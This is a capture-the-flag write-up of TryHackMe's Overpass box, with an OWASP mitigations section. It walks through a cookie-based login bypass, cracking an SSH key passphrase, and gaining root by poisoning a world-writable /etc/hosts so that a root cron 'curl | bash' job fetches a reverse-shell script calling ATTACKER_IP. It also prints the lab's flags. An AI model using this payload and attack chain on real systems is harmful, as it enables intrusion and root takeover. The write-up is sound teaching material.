```
  ___  __   ____  ____  ____   __   ____  ____ 
 / __)/  \ (  _ \(  _ \(  _ \ / _\ / ___)/ ___)
( (__(  O ) )   / )   / ) __//    \\___ \\___ \
 \___)\__/ (__\_)(____/(__)  \_/\_/(____/(____/
```

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** Linux, Web, OWASP Top 10, Privilege Escalation

---

## Table of Contents

1. [Progress Checklist](#progress-checklist)
2. [Tools Used](#tools-used)
3. [TL;DR](#tldr)
4. [Introduction](#introduction)
5. [Recon](#recon)
6. [Foothold](#foothold)
7. [Shell / Initial Access](#shell--initial-access)
8. [Escalation Path](#escalation-path)
9. [Exploitation](#exploitation)
10. [Rabbit Holes](#rabbit-holes)
11. [Flag](#flag)
12. [Mitigations](#mitigations)
13. [Key Takeaway](#key-takeaway)
14. [If I Did It Again](#if-i-did-it-again)
15. [Changelog](#changelog)

---

## Progress Checklist

- [x] Run nmap scan to identify open ports
- [x] Enumerate HTTP service on port 80
- [x] Run gobuster to find hidden directories
- [x] Discover `/admin` login page
- [x] Inspect JavaScript source — find broken auth logic
- [x] Set `SessionToken` cookie manually to bypass login
- [x] Retrieve RSA private key for user james
- [x] Convert RSA key with `ssh2john`
- [x] Crack RSA passphrase with `john` + rockyou.txt
- [x] SSH into the box as james
- [x] Read user flag (`user.txt`)
- [x] Check crontab — find root-owned scheduled job
- [x] Confirm `/etc/hosts` is world-writable
- [x] Stand up Python HTTP server serving malicious `buildscript.sh`
- [x] Edit `/etc/hosts` to redirect `overpass.thm` to attacker IP
- [x] Wait for cron to execute — receive root shell callback
- [x] Read root flag (`/root/root.txt`)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service fingerprinting |
| gobuster | Web directory brute-force |
| curl / browser DevTools | Inspecting HTTP responses and cookies |
| ssh2john | Convert SSH private key to john-crackable hash |
| john (John the Ripper) | Crack RSA key passphrase |
| ssh | Connect to target as james |
| python3 | Serve malicious buildscript via HTTP server |
| nc (netcat) | Receive reverse shell callback |
| cat / ls | Flag retrieval |

---

## TL;DR

Nmap reveals SSH on port 22 and an HTTP web app on port 80 advertising a fake password manager called "Overpass." Gobuster finds an `/admin` path whose login form is protected by client-side JavaScript with a broken authentication check — setting any value for the `SessionToken` cookie skips the check entirely. Behind that page sits a passphrase-protected RSA key belonging to user james. `ssh2john` + `john` with rockyou.txt cracks the passphrase to `james13`. Once on the box, a crontab entry running as root curl-fetches `overpass.thm/downloads/src/buildscript.sh` every minute and pipes it directly to bash. Because `/etc/hosts` is world-writable, redirecting `overpass.thm` to the attacker machine and serving a reverse-shell payload escalates to root.

---

## Introduction

Overpass is a beginner-friendly Linux box built around two genuinely transferable vulnerabilities: broken authentication via client-side logic, and an insecure cron job compounded by a world-writable `/etc/hosts`. The broken-auth finding maps directly to **OWASP A07:2021 – Identification and Authentication Failures** (formerly Broken Authentication, A2:2017). The privesc is a classic supply-chain-style attack: a privileged process fetches and executes external code, and the attacker controls where that code comes from. Neither vuln requires a CVE — both are configuration and design failures that show up in real environments more often than they should.

---

## Recon

### Port Scan

```bash
nmap -sC -sV -oN nmap_initial.txt 10.10.x.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:96:85:98:d1:30:b5:f2:d4:d1:25:e7:6b:09:d2:04 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports. HTTP is served by a Go binary — worth keeping in mind. The site presents itself as a "military-grade, open-source password manager."

### Web Directory Enumeration

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

```
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 0] [--> admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 200) [Size: 2431]
```

`/admin` is the interesting one. Everything else is static.

---

## Foothold

### Broken Authentication via Client-Side Cookie Check

Navigating to `http://10.10.x.x/admin` shows a login form. Opening DevTools → Sources reveals `/login.js`:

```javascript
async function login() {
    const usernameBox = document.querySelector('#username');
    const passwordBox = document.querySelector('#password');
    const loginStatus = document.querySelector('#loginStatus');
    loginStatus.textContent = ''
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=''
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The login API returns either the string `"Incorrect credentials"` or a session token. The JavaScript then checks for that exact string — anything else gets stored as a cookie and redirects to `/admin`. The `/admin` page itself only checks that the `SessionToken` cookie **exists**, not that it has a valid value.

Fix: set the cookie to anything.

```bash
# In browser DevTools console:
document.cookie = "SessionToken=anything"
# Then navigate to /admin
```

The page now renders a note to James along with his RSA private key.

---

## Shell / Initial Access

### Save the RSA Key

Copy the key from the `/admin` page and save it locally:

```bash
nano id_rsa_james
chmod 600 id_rsa_james
```

### Convert and Crack the Passphrase

```bash
ssh2john id_rsa_james > james_hash.txt
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt james_hash.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa_james)
1g 0:00:00:05 DONE (2024-01-01 12:00) 0.1960g/s 2811Kp/s
```

Passphrase: **james13**

### SSH In

```bash
ssh -i id_rsa_james james@10.10.x.x
```

Enter passphrase `james13` when prompted.

```
james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
```

### User Flag

```bash
cat ~/user.txt
```

```
thm{65c1aaf000506e56996822c6281e6bf7}
```

### Shell Stabilisation

The SSH session is already a proper TTY — no stabilisation needed.

---

## Escalation Path

### Crontab Enumeration

```bash
cat /etc/crontab
```

```
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Every minute, root fetches `overpass.thm/downloads/src/buildscript.sh` and pipes it to bash. The script runs as root with zero validation.

### Check /etc/hosts Permissions

```bash
ls -la /etc/hosts
```

```
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

World-writable. That's the entire privesc on a plate.

---

## Exploitation

### Step 1 — Set Up Malicious buildscript.sh

On the attacker machine, create the directory structure the cron job expects:

```bash
mkdir -p downloads/src
```

```bash
cat > downloads/src/buildscript.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
```

### Step 2 — Start a Listener

```bash
nc -lvnp 4444
```

### Step 3 — Start the Python HTTP Server

Run from the directory containing `downloads/`:

```bash
python3 -m http.server 80
```

### Step 4 — Poison /etc/hosts on the Target

Back on the james SSH session:

```bash
echo "ATTACKER_IP overpass.thm" >> /etc/hosts
```

Verify:

```bash
cat /etc/hosts | grep overpass
```

```
ATTACKER_IP overpass.thm
```

### Step 5 — Wait for the Cron Job (≤ 60 seconds)

The HTTP server logs the request:

```
10.10.x.x - - [GET /downloads/src/buildscript.sh HTTP/1.1] 200 -
```

The netcat listener receives the connection:

```
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.x.x] 49876
root@overpass-prod:~#
```

### Root Flag

```bash
cat /root/root.txt
```

```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

---

## Rabbit Holes

- **Trying SQL injection on the login form** — the form POSTs to `/api/login` which is a Go handler. Spent a few minutes fuzzing before just reading the JS source. Reading the source first would have saved the time.
- **Attempting to crack james's system password** — `/etc/shadow` isn't readable as james, and it turned out to be irrelevant once the cron path was clear.
- **Looking at the Overpass binary in `/downloads`** — the downloadable Go source for the password manager is in `/home/james/`. Briefly reversed it looking for hardcoded credentials. There are none that matter for this path.
- **Checking SUID binaries** — `find / -perm -4000 2>/dev/null` returns the usual suspects (sudo, passwd, etc.). None exploitable without more enumeration effort, and the cron path was already obvious.

---

## Flag

| Flag | Value |
|------|-------|
| User (`user.txt`) | `thm{65c1aaf000506e56996822c6281e6bf7}` |
| Root (`root.txt`) | `thm{7f336f8c359dbac18d54fdd64ea753bb}` |

---

## Mitigations

**Broken Client-Side Authentication**
The `/admin` login relies entirely on JavaScript to enforce authentication — the server returns a cookie without validating session state, and the admin page checks only for cookie existence. Fix: move all authentication logic server-side. The session token should be cryptographically random, stored server-side, and validated on every request to a protected route. Cookie presence alone is not a security check.

**Passphrase-Protected Key Left in a Web-Accessible Location**
The RSA private key for james was retrievable from the admin panel without any further authentication. Even with a passphrase, distributing private keys via web interfaces is bad practice. Fix: never expose private keys through any web interface. Provision access via SSH certificates or distribute keys through a secrets management system (Vault, AWS Secrets Manager, etc.) with audit logging.

**World-Writable /etc/hosts**
`/etc/hosts` had `0666` permissions, allowing any unprivileged user to redirect hostname resolution. On any standard Linux system this file should be `0644` (root rw, others r). Fix: `chmod 644 /etc/hosts`. Additionally, audit all files under `/etc` for unexpected write permissions with `find /etc -writable -not -user root`.

**Cron Job Fetching and Executing Remote Code as Root**
A root-owned cron job fetched an external URL and piped it directly to bash with no integrity verification. This is a textbook supply-chain execution vulnerability: control the DNS or the server, control root execution. Fix: never `curl | bash` anything as a privileged user. If a script must be distributed this way, at minimum: host it on a fixed IP (not hostname), verify a checksum or GPG signature before executing, and run the job under a least-privilege service account rather than root.

---

## Key Takeaway

Two lessons here that both show up in real environments:

1. **Read the JavaScript.** Client-side auth is not auth. Any logic the browser can read, the attacker can bypass. Before bruteforcing a login form, check what the JS actually does — it took thirty seconds to spot the cookie check here.

2. **`curl | bash` as root is surrender.** The moment a privileged process fetches and executes remote content, the attacker's control radius expands to wherever DNS or the network can be influenced. Combine that with a world-writable `/etc/hosts` and it's one-shot root. Check crontabs and world-writable system files early in every privesc enum pass.

---

## If I Did It Again

- Skip the login brute-force instinct entirely — open DevTools first, always.
- Run `cat /etc/crontab` and `find /etc -writable` as the second and third commands after landing a shell, before touching linpeas.
- The Python HTTP server path is clean but fragile on flaky networks. Next time I'd pre-stage the payload with a more reliable delivery (e.g., nc file transfer) in case the cron timing is tight.

---

## Changelog

| Version | Date | Notes |
|---------|------|-------|
| 1.0 | 2026-10-23 | Initial writeup |

---

[^ Back to top](#)
